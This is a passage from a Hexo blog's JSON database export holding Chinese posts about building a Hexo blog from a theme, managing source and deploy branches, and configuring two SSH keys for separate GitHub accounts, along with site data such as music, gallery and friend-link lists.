class=\"token keyword\">.</span> S <span class=\"token operator\">=</span>o.    <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>       <span class=\"token operator\">=</span> <span class=\"token operator\">=</span>++.    <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>      <span class=\"token keyword\">.</span> B.<span class=\"token operator\">=</span>.Eo<span class=\"token punctuation\">..</span> <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>       o B <span class=\"token keyword\">.</span> +o <span class=\"token keyword\">.</span><span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>          <span class=\"token keyword\">.</span> o<span class=\"token punctuation\">..</span> <span class=\"token punctuation\">..</span> <span class=\"token operator\">|</span>\n+----<span class=\"token punctuation\">[</span>SHA256<span class=\"token punctuation\">]</span>-----+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>自己把ssh公钥上传到远程git服务器上去</p>\n<p>然后打开.ssh文件中的config文件（没有就自己创建一个）</p>\n<p>添加如下代码</p>\n<pre><code>#Default GitHub\n  Host github.com        //主机名称\n  HostName github.com    //主机\n  User git\n  IdentityFile ~/.ssh/id_rsa    //密钥文件\n\n  Host github-wustais    //同上，这里相当于为github.com起了个别名，使用这个别名的时候用的密钥文件就会是id_rsa_ais\n  HostName github.com\n  User git\n  IdentityFile ~/.ssh/id_rsa_ais    //这里你刚刚创建的密钥文件叫什么就改成什么</code></pre><p>然后</p>\n<p><strong>将GitHub SSH仓库地址中的<a href=\"mailto:git@github.com\" target=\"_blank\" rel=\"noopener\">git@github.com</a>替换成新建的Host别名。</strong></p>\n<pre><code>//修改之前\n$ git remote -v\ngithub  git@github.com:xxx/xxx.git (fetch)\ngithub  git@github.com:xxx/xxx.git (push)\n//这里如果你是使用https方式clone的仓库的话，显示的是https://github.com/xxx/xxx.git,对后续操作没什么影响\n\n//修改 remote set-url\n$ git remote set-url github  github-wustais:xxx/xxx.git</code></pre><p>验证</p>\n<pre><code>//使用修改后的github-wustais SSH连接，连接成功用户是协会账户，此时公钥是id_rsa_ais\n\n$ ssh -T github-wustais    //这里写成git@github-wustais也行\nHi xxx! You've successfully authenticated, but GitHub does not provide shell access.    //这就是成功了，后面这句话是告诉你你没有远程操作控制台的许可，因为用了命令中用了-T参数\n\n//使用默认的git@github.com SSH去连接,连接成功用户是我的私有账户，此时公钥是id_rsa\n$ ssh -T git@github.com\nHi xxx! You've successfully authenticated, but GitHub does not provide shell access.</code></pre><p>修改之后,需要切换成对应的ssh</p>\n<p><strong>有如下两种解决方法：</strong></p>\n<p>打开.git/config文件</p>\n<pre class=\"line-numbers language-plain\"><code class=\"language-plain\">更改[remote \"origin\"]项中的url  \n对应上面配置的host[remote \"origin\"] url = git@github-wustais:xxx/xxxx.git    //这里不要git@也行<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p> 或者在Git Bash中修改remote  </p>\n<pre class=\"line-numbers language-plain\"><code class=\"language-plain\">$ git remote rm origin\n$ git remote add origin git@github-wustais:xxx/xxxx.git        //这里不要git@也行<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>验证</p>\n<pre><code>$ git remote -v\ngithub  github-wustais:xxx/xxx.git (fetch)\ngithub  github-wustais:xxx/xxx.git (push)</code></pre><p>这时，使用的ssh就会根据.ssh/onfig文件更改为 id-rsa-ais</p>\n<p>便可以连接上远程仓库<code>github-wustais:xxx/xxx.git</code>，即<code>git@github.com:xxx/xxx.git</code>了。</p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"简短介绍\"><a href=\"#简短介绍\" class=\"headerlink\" title=\"简短介绍\"></a>简短介绍</h1><p>倒腾了一两周总算把个人博客网站完善了，目前这个版本使用应该是够了，当然还有一些优化项和功能增加后续在慢慢更新。</p>\n<p>本博客基于<code>Hexo</code>框架搭建，用到模板基础为<a href=\"https://github.com/shw2018/hexo-theme-matery\" target=\"_blank\" rel=\"noopener\">hexo-theme-matery</a>主题,并在此基础之上做了很多修改的洪卫大佬的<a href=\"https://github.com/shw2018/hexo-blog-fly.git\" target=\"_blank\" rel=\"noopener\">hexo-blog-fly</a>主题，做了一些个性化修改。洪卫大佬博客地址：<a href=\"https://shw2018.github.io/\" target=\"_blank\" rel=\"noopener\">https://shw2018.github.io</a>，博客演示：<a href=\"https://sunhwee.com\" target=\"_blank\" rel=\"noopener\">sunhwee.com</a>。</p>\n<hr>\n<h2 id=\"特性\"><a href=\"#特性\" class=\"headerlink\" title=\"特性\"></a>特性</h2><p><strong>原 matery 主题特性</strong>:</p>\n<ul>\n<li><p>简单漂亮，文章内容美观易读</p>\n</li>\n<li><p><a href=\"https://material.io/\" target=\"_blank\" rel=\"noopener\">Material Design</a> 设计</p>\n</li>\n<li><p>响应式设计，博客在桌面端、平板、手机等设备上均能很好的展现</p>\n</li>\n<li><p>首页轮播文章及每天动态切换 <code>Banner</code> 图片</p>\n</li>\n<li><p>瀑布流式的博客文章列表（文章无特色图片时会有 <code>24</code> 张漂亮的图片代替）</p>\n</li>\n<li><p>时间轴式的归档页</p>\n</li>\n<li><p><strong>词云</strong>的标签页和<strong>雷达图</strong>的分类页</p>\n</li>\n<li><p>丰富的关于我页面（包括关于我、文章统计图、我的项目、我的技能、相册等）</p>\n</li>\n<li><p>可自定义的数据的友情链接页面</p>\n</li>\n<li><p>支持文章置顶和文章打赏</p>\n</li>\n<li><p>支持 <code>MathJax</code></p>\n</li>\n<li><p><code>TOC</code> 目录</p>\n</li>\n<li><p>可设置复制文章内容时追加版权信息</p>\n</li>\n<li><p>可设置阅读文章时做密码验证</p>\n</li>\n<li><p><a href=\"https://gitalk.github.io/\" target=\"_blank\" rel=\"noopener\">Gitalk</a>、<a href=\"https://imsun.github.io/gitment/\" target=\"_blank\" rel=\"noopener\">Gitment</a>、<a href=\"https://valine.js.org/\" target=\"_blank\" rel=\"noopener\">Valine</a> 和 <a href=\"https://disqus.com/\" target=\"_blank\" rel=\"noopener\">Disqus</a> 评论模块（推荐使用 <code>Gitalk</code>）</p>\n</li>\n<li><p>集成了<a href=\"http://busuanzi.ibruce.info/\" target=\"_blank\" rel=\"noopener\">不蒜子统计</a>、谷歌分析（<code>Google Analytics</code>）和文章字数统计等功能</p>\n</li>\n<li><p>支持在首页的音乐播放和视频播放功能</p>\n<p><strong>增加的工作或特性(未打钩的是已做但还没更新到源码的)</strong>:</p>\n</li>\n<li><p>修改了原主题的一些<code>bug</code>   2019.08.05</p>\n</li>\n<li><p>加入图片懒加载功能，在根目录配置文件开启和关闭    2019.08.09</p>\n</li>\n<li><p>增加<code>留言板</code>功能          2019.08.05</p>\n</li>\n<li><p>在关于板块,加入<code>简历</code>功能页   2019.08.05</p>\n</li>\n<li><p>增加视听[视觉听觉影音]板块       2019.08.10</p>\n</li>\n<li><p>支持<code>emoji</code>表情，用<code>markdown emoji</code>语法书写直接生成对应的能<strong>跳跃</strong>的表情。  2019.08.10</p>\n</li>\n<li><p>增加网站运行时间显示  2019.08.10</p>\n</li>\n<li><p>增加<code>动漫模型</code>     2019.08.10</p>\n</li>\n<li><p>整体替换Banner图片和文章特色图片   2019.08.10</p>\n</li>\n<li><p>增加分类<code>相册</code>功能         2019.08.29</p>\n</li>\n<li><p>去掉标签页,将其合并至<code>分类</code>页中                2019.09.01</p>\n</li>\n<li><p>修改了一些控件的参数   2019.09.01</p>\n</li>\n<li><p>修改部分样式,比如: 文章卡片,固定高度,使其不至于因为文章摘要的长短不同导致卡片大小不一使页面布局很不美观,类似的还有友链卡片,优化了页面内容布局,视觉更整齐美观          2019.09.01</p>\n</li>\n<li><p>解决首页文章列表卡片上方 <code>border-radius</code>圆角失效的bug  2019.09.01</p>\n</li>\n<li><p>添加页面樱花飘落动效            2019.09.09</p>\n</li>\n<li><p>添加鼠标点击烟花爆炸动效   2019.09.09</p>\n</li>\n<li><p>加入天气接口控件   2019.09.09</p>\n</li>\n<li><p>加入鼠标点击文字特效   2019.09.10</p>\n</li>\n<li><p>添加页面雪花飘落动效            2019.09.10</p>\n</li>\n<li><p>添加在线聊天插件            2019.09.12</p>\n</li>\n<li><p>持续更新…</p>\n</li>\n</ul>\n<hr>\n<p><strong>简单使用方法：</strong></p>\n<ol>\n<li><p><code>star</code> 本项目</p>\n</li>\n<li><p>安装<a href=\"https://git-scm.com/downloads\" target=\"_blank\" rel=\"noopener\">Git</a>, 安装<a href=\"https://nodejs.org/en/\" target=\"_blank\" rel=\"noopener\">nodeJS</a></p>\n</li>\n<li><p>你可以直接<code>fork</code>一份源码到你的仓库，<code>clone</code>到本地</p>\n</li>\n<li><p>在本地博客仓库运行<code>npm i</code>命令安装依赖包</p>\n</li>\n<li><p>修改配置信息，改成自己的信息</p>\n</li>\n<li><p>运行命令<code>hexo  clean</code>（清除生成文件），<code>hexo g</code>（生成网页）， <code>hexo  s</code>（本地预览），<code>hexo d</code>（部署）</p>\n</li>\n</ol>\n<h2 id=\"博客模板源文件使用方法详解\"><a href=\"#博客模板源文件使用方法详解\" class=\"headerlink\" title=\"博客模板源文件使用方法详解\"></a>博客模板源文件使用方法详解</h2><p>这两天为了解决协会博客的奇葩问题和重建自己的博客真是查了不少资料，恶补了一波git，算是基本弄清楚了git的简单使用原理以及hexo这种博客模板的基本结构和工作原理（当然也只是会用不会写，刚刚试图魔改就失败了，害）。</p>\n<p><strong>hexo博客目录结构</strong></p>\n<pre><code>- node_modules        //node.js库文件按\n- public        //hexo d 发布的目录\n- scaffolds        //hexo 模板文件\n- source        //网站源码\n    - _data\n    - _posts\n    - about\n    - archives\n    - categories\n    - friends\n    - tags\n- themes        //主题源码</code></pre><p>而一个现成的博客模板的核心文件只有五个</p>\n<pre><code>scaffolds\nsource\nthemes\n_config.yml\npackage.json</code></pre><p>除了这五个，其它的文件都是附加产品</p>\n<p>把一个博客模板clone到本地仓库后，只有这五个文件是必须的，其它的都可以删了，然后使用</p>\n<pre><code class=\"bash\">npm install hexo    //安装hexo框架\nnpm install        //安装必要插件\nnpm install hexo-deployer-git        //安装hexo的deployer插件</code></pre>\n<p>如果clone下来的源码有<code>node_modules</code>，<code>package-lock.json</code>，<code>db.json</code>文件的话，则只要使用<code>npm install</code>命令即可，如果有问题的话，就把其它的东西删掉，留下五个核心文件，再跑一遍上面三个命令就行</p>\n<p>如果是第一次搭建博客的话，这里有一个关键技巧，<strong>以上操作切换到hexo分支上进行，然后保证<code>_config.yml</code>文件中的deploy参数中的branch（分支）参数为<code>master</code></strong>。</p>\n<pre><code>git checkout -b hexo        //新建并切换到hexo分支</code></pre><p>这样就可以使得<code>hexo d</code>上传的分支为master分支，而源码push的分支为<code>hexo</code>。我们就可以实现在一个仓库中通过两个不同分支同时保存网站和源码（记得把github pages调到master分支上，2020年以后github的默认分支变成了main分支）</p>\n<p>每次在提交博客前，先使用“git”三连上传源码备份</p>\n<pre><code>git add.\ngit commit -m &quot;message&quot;\ngit push origin hexo        //切记这里是hexo分支</code></pre><p>养成好习惯</p>\n<p>然后再用<code>hexo g -d</code>命令提交博客</p>\n<p>这里还有一个小技巧，万一哪天太久没写博客或者脑抽忘了在push后面加上 origin hexo，那可就麻烦大了，虽然有补救措施，但我们应该避免这种麻烦</p>\n<p>这时可以使用</p>\n<pre><code class=\"bash\">git branch --set-upstream-to=origin/hexo hexo</code></pre>\n<p>这条命令指定hexo分支的默认远程上传仓库为hexo，这样hexo 默认<code>git push</code>的就是 hexo分支，大大降低手残操作带来的麻烦的可能性。</p>\n<h2 id=\"在一个电脑上使用两个ssh的方法\"><a href=\"#在一个电脑上使用两个ssh的方法\" class=\"headerlink\" title=\"在一个电脑上使用两个ssh的方法\"></a>在一个电脑上使用两个ssh的方法</h2><p>有时候我们会遇到这种情况，手上有两个git账号要管理，一个私人的一个公有的（或者干脆就有两个私人的），但使用ssh远程连接时会遇到问题。</p>\n<p>一个ssh密钥只能连接一个账户或者仓库，这使我们管理两个账户时非常不方便，一个用了ssh以后另外一个就不能用了</p>\n<p>这时的解决方法是利用config文件再创建一个ssh密钥并指定主机别名来连接远程git账户（无论是github还是别的git服务器都可以）</p>\n<p>用git bash或者命令行打开系统盘“用户”目录下的.ssh文件</p>\n<pre><code class=\"bash\">ssh-keygen -t rsa -C &quot;这里输入邮箱，其实输啥都行&quot;        //创建新ssh密钥\nGenerating public/private rsa key pair.\nEnter file in which to save the key (/Users/Apple/.ssh/id_rsa): [输入密钥文件名，直接回车就是括号中的默认名称]      //创建第二个ssh密钥不能使用默认的了，我为协会博客创建了一个id_rsa_ais,这个名字可以随便取        \n\n/Users/xxx/.ssh/id_rsa_ais\nEnter passphrase (empty for no passphrase):         //添加密码，建议直接回车，使用ssh就是为了省事和安全，再加个密码多此一举了\nEnter same passphrase again: \nYour identification has been saved in /Users/Apple/.ssh/id_rsa_ais.    //私钥\nYour public key has been saved in /Users/Apple/.ssh/id_rsa_ais.pub. //公钥\nThe key fingerprint is:\nSHA256:1gepuxDHwJRnFbKvc0Zq/NGrFGE9kEXS06jxatPPrSQ xxx@xxx.com //你刚刚输入的邮箱\nThe key&#39;s randomart image is:\n+---[RSA 2048]----+\n|      ....=*oo   |\n|     o. ooo=+ .  |\n|      oo. =+o.   |\n|       o =.o..   |\n|      . S =o.    |\n|       = =++.    |\n|      . B.=.Eo.. |\n|       o B . +o .|\n|          . o.. .. |\n+----[SHA256]-----+</code></pre>\n<p>自己把ssh公钥上传到远程git服务器上去</p>\n<p>然后打开.ssh文件中的config文件（没有就自己创建一个）</p>\n<p>添加如下代码</p>\n<pre><code>#Default GitHub\n  Host github.com        //主机名称\n  HostName github.com    //主机\n  User git\n  IdentityFile ~/.ssh/id_rsa    //密钥文件\n\n  Host github-wustais    //同上，这里相当于为github.com起了个别名，使用这个别名的时候用的密钥文件就会是id_rsa_ais\n  HostName github.com\n  User git\n  IdentityFile ~/.ssh/id_rsa_ais    //这里你刚刚创建的密钥文件叫什么就改成什么</code></pre><p>然后</p>\n<p><strong>将GitHub SSH仓库地址中的<a href=\"mailto:git@github.com\" target=\"_blank\" rel=\"noopener\">git@github.com</a>替换成新建的Host别名。</strong></p>\n<pre><code>//修改之前\n$ git remote -v\ngithub  git@github.com:xxx/xxx.git (fetch)\ngithub  git@github.com:xxx/xxx.git (push)\n//这里如果你是使用https方式clone的仓库的话，显示的是https://github.com/xxx/xxx.git,对后续操作没什么影响\n\n//修改 remote set-url\n$ git remote set-url github  github-wustais:xxx/xxx.git</code></pre><p>验证</p>\n<pre><code>//使用修改后的github-wustais SSH连接，连接成功用户是协会账户，此时公钥是id_rsa_ais\n\n$ ssh -T github-wustais    //这里写成git@github-wustais也行\nHi xxx! You&#39;ve successfully authenticated, but GitHub does not provide shell access.    //这就是成功了，后面这句话是告诉你你没有远程操作控制台的许可，因为用了命令中用了-T参数\n\n//使用默认的git@github.com SSH去连接,连接成功用户是我的私有账户，此时公钥是id_rsa\n$ ssh -T git@github.com\nHi xxx! You&#39;ve successfully authenticated, but GitHub does not provide shell access.</code></pre><p>修改之后,需要切换成对应的ssh</p>\n<p><strong>有如下两种解决方法：</strong></p>\n<p>打开.git/config文件</p>\n<pre><code class=\"plain\">更改[remote &quot;origin&quot;]项中的url  \n对应上面配置的host[remote &quot;origin&quot;] url = git@github-wustais:xxx/xxxx.git    //这里不要git@也行</code></pre>\n<p> 或者在Git Bash中修改remote  </p>\n<pre><code class=\"plain\">$ git remote rm origin\n$ git remote add origin git@github-wustais:xxx/xxxx.git        //这里不要git@也行</code></pre>\n<p>验证</p>\n<pre><code>$ git remote -v\ngithub  github-wustais:xxx/xxx.git (fetch)\ngithub  github-wustais:xxx/xxx.git (push)</code></pre><p>这时，使用的ssh就会根据.ssh/onfig文件更改为 id-rsa-ais</p>\n<p>便可以连接上远程仓库<code>github-wustais:xxx/xxx.git</code>，即<code>git@github.com:xxx/xxx.git</code>了。</p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"ckkntx9ja000axov74qaqo4nv","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9ji000ixov7a0s4el0h"},{"post_id":"ckkntx9ix0002xov7r4nqmj77","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9jk000mxov7qhxo2cye"},{"post_id":"ckkntx9jc000cxov76n79946s","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9jm000pxov70v4wz237"},{"post_id":"ckkntx9jg000gxov72k96cr1m","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9jo000txov75lhcyoao"},{"post_id":"ckkntx9j20004xov77lct0873","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9jp000vxov7y7prn138"},{"post_id":"ckkntx9jh000hxov7csuzazax","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9jr000yxov7tgucw0re"},{"post_id":"ckkntx9jj000lxov7ckxb9c82","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9jt0011xov7ksqkt74h"},{"post_id":"ckkntx9j70008xov79ic0k7bb","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9ju0014xov79wmpsxmt"},{"post_id":"ckkntx9jl000oxov7m890sqeb","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9jw0017xov7sod75p9s"},{"post_id":"ckkntx9jn000sxov76ftkhpiu","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9jx0019xov7qt6o5zvr"},{"post_id":"ckkntx9jp000uxov70qgyrlvs","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9jz001cxov7sit1l4f1"},{"post_id":"ckkntx9jq000xxov7fsf2pr91","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9k1001fxov7yc70yt9e"},{"post_id":"ckkntx9js0010xov7l1ay4ke2","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9k2001jxov7bpmlq3fq"},{"post_id":"ckkntx9ju0013xov7m7zjwxie","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9k4001mxov7qsnriqxz"},{"post_id":"ckkntx9jv0016xov7gmqitli7","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9k5001qxov7kaq50kf3"},{"post_id":"ckkntx9jx0018xov7yi5501f7","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9k7001txov7agsxa2fp"},{"post_id":"ckkntx9jy001bxov70fbyyofv","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9k9001xxov77uggnbhy"},{"post_id":"ckkntx9k0001exov7slf4rzxv","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9ka001zxov7vl6mnnl6"},{"post_id":"ckkntx9k2001ixov7cc24fj4c","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9kc0022xov77953v4aa"},{"post_id":"ckkntx9k3001lxov7gbu5hrmj","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9kd0025xov7afga6idx"},{"post_id":"ckkntx9k5001pxov7gz5p3m9c","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9kf0029xov73hmru0vj"},{"post_id":"ckkntx9k6001sxov7j8p9er63","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9kh002cxov7zm69rjb7"},{"post_id":"ckkntx9k8001wxov7vomp52s6","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9ki002fxov7lo9kw4yd"},{"post_id":"ckkntx9k9001yxov7lcpdqe5u","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9kk002jxov7cje0jtny"},{"post_id":"ckkntx9kb0021xov7thxhgm1k","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9kl002mxov7duk709ha"},{"post_id":"ckkntx9kd0024xov7vcgw4qnu","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9kn002qxov7jgt33580"},{"post_id":"ckkntx9ke0028xov7yf0ozolb","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9kp002txov71sv9jvde"},{"post_id":"ckkntx9kg002bxov7gi7i5pnj","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9kq002xxov7tpie3q16"},{"post_id":"ckkntx9kh002exov7a9bz1cav","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9ks0030xov7hebdd9ut"},{"post_id":"ckkntx9kj002ixov777fhafmo","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9kt0033xov7fgid2k93"},{"post_id":"ckkntx9kl002lxov784d22w5i","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9ku0036xov7ywloukqk"},{"post_id":"ckkntx9km002pxov7c8j3ylrd","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9ku0039xov7dcb69mge"},{"post_id":"ckkntx9ko002sxov7aq6zosv0","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9kv003bxov73ytul8ij"},{"post_id":"ckkntx9kq002wxov7q8b18qeu","category_id":"ckkntx9j40005xov7ebykbtdq","_id":"ckkntx9kw003exov7mmt2bd6c"},{"post_id":"ckkntx9kr002zxov7cvfsn2ej","category_id":"ckkntx9kt0035xov7pkt9uj7z","_id":"ckkntx9kx003kxov7hnjiyrsq"},{"post_id":"ckkntx9kr002zxov7cvfsn2ej","category_id":"ckkntx9kv003dxov7qp6fi7jh","_id":"ckkntx9ky003mxov7pqlq8eh7"}],"PostTag":[{"post_id":"ckkntx9ix0002xov7r4nqmj77","tag_id":"ckkntx9j60006xov7t5n2uee1","_id":"ckkntx9jk000nxov785ybzo85"},{"post_id":"ckkntx9ix0002xov7r4nqmj77","tag_id":"ckkntx9jd000exov7rgm24ezs","_id":"ckkntx9jm000qxov7rliwpocw"},{"post_id":"ckkntx9j20004xov77lct0873","tag_id":"ckkntx9jj000kxov7846f3rdj","_id":"ckkntx9js000zxov7zzpnzneu"},{"post_id":"ckkntx9j20004xov77lct0873","tag_id":"ckkntx9jn000rxov793tdax5d","_id":"ckkntx9jt0012xov7dp0vtydd"},{"post_id":"ckkntx9j70008xov79ic0k7bb","tag_id":"ckkntx9jq000wxov7c1xa93ob","_id":"ckkntx9jz001dxov7pibnune9"},{"post_id":"ckkntx9j70008xov79ic0k7bb","tag_id":"ckkntx9jv0015xov7f1p3ony3","_id":"ckkntx9k1001gxov76tppslbh"},{"post_id":"ckkntx9ja000axov74qaqo4nv","tag_id":"ckkntx9j60006xov7t5n2uee1","_id":"ckkntx9k3001kxov7r7exajxu"},{"post_id":"ckkntx9ja000axov74qaqo4nv","tag_id":"ckkntx9jy001axov70q96hxe3","_id":"ckkntx9k4001nxov7mfi57lvx"},{"post_id":"ckkntx9jc000cxov76n79946s","tag_id":"ckkntx9j60006xov7t5n2uee1","_id":"ckkntx9k6001rxov7bs3sbs50"},{"post_id":"ckkntx9jc000cxov76n79946s","tag_id":"ckkntx9k1001hxov784g5uzwk","_id":"ckkntx9k7001uxov7jk195k1a"},{"post_id":"ckkntx9jg000gxov72k96cr1m","tag_id":"ckkntx9jy001axov70q96hxe3","_id":"ckkntx9kc0023xov7noido14y"},{"post_id":"ckkntx9jg000gxov72k96cr1m","tag_id":"ckkntx9jq000wxov7c1xa93ob","_id":"ckkntx9ke0026xov7ecjxhlkw"},{"post_id":"ckkntx9kb0021xov7thxhgm1k","tag_id":"ckkntx9jy001axov70q96hxe3","_id":"ckkntx9kg002axov7ejngch6v"},{"post_id":"ckkntx9kb0021xov7thxhgm1k","tag_id":"ckkntx9jq000wxov7c1xa93ob","_id":"ckkntx9kh002dxov7235saumy"},{"post_id":"ckkntx9kd0024xov7vcgw4qnu","tag_id":"ckkntx9jy001axov70q96hxe3","_id":"ckkntx9kj002hxov720fwp76c"},{"post_id":"ckkntx9kd0024xov7vcgw4qnu","tag_id":"ckkntx9jq000wxov7c1xa93ob","_id":"ckkntx9kk002kxov7xmxznxdc"},{"post_id":"ckkntx9kg002bxov7gi7i5pnj","tag_id":"ckkntx9jy001axov70q96hxe3","_id":"ckkntx9km002oxov76kl1td3q"},{"post_id":"ckkntx9kg002bxov7gi7i5pnj","tag_id":"ckkntx9jq000wxov7c1xa93ob","_id":"ckkntx9ko002rxov7lkoxla44"},{"post_id":"ckkntx9jh000hxov7csuzazax","tag_id":"ckkntx9jy001axov70q96hxe3","_id":"ckkntx9kp002vxov7h84ejhc0"},{"post_id":"ckkntx9jh000hxov7csuzazax","tag_id":"ckkntx9ke0027xov7uijn5ouu","_id":"ckkntx9kr002yxov7gcgihgo7"},{"post_id":"ckkntx9jj000lxov7ckxb9c82","tag_id":"ckkntx9j60006xov7t5n2uee1","_id":"ckkntx9kt0032xov7csw2ly6l"},{"post_id":"ckkntx9jj000lxov7ckxb9c82","tag_id":"ckkntx9k1001hxov784g5uzwk","_id":"ckkntx9kt0034xov7j9d0ui4m"},{"post_id":"ckkntx9jl000oxov7m890sqeb","tag_id":"ckkntx9jy001axov70q96hxe3","_id":"ckkntx9ku0038xov736qq1rkc"},{"post_id":"ckkntx9jl000oxov7m890sqeb","tag_id":"ckkntx9ke0027xov7uijn5ouu","_id":"ckkntx9ku003axov7mj9hhu8y"},{"post_id":"ckkntx9jn000sxov76ftkhpiu","tag_id":"ckkntx9jy001axov70q96hxe3","_id":"ckkntx9kw003fxov7g8q0crx6"},{"post_id":"ckkntx9jn000sxov76ftkhpiu","tag_id":"ckkntx9ku0037xov798vcu6ik","_id":"ckkntx9kw003gxov7yq4h4j77"},{"post_id":"ckkntx9jp000uxov70qgyrlvs","tag_id":"ckkntx9jy001axov70q96hxe3","_id":"ckkntx9kx003jxov7h91k5kj9"},{"post_id":"ckkntx9jp000uxov70qgyrlvs","tag_id":"ckkntx9ke0027xov7uijn5ouu","_id":"ckkntx9ky003lxov7fgl87m0c"},{"post_id":"ckkntx9jq000xxov7fsf2pr91","tag_id":"ckkntx9jy001axov70q96hxe3","_id":"ckkn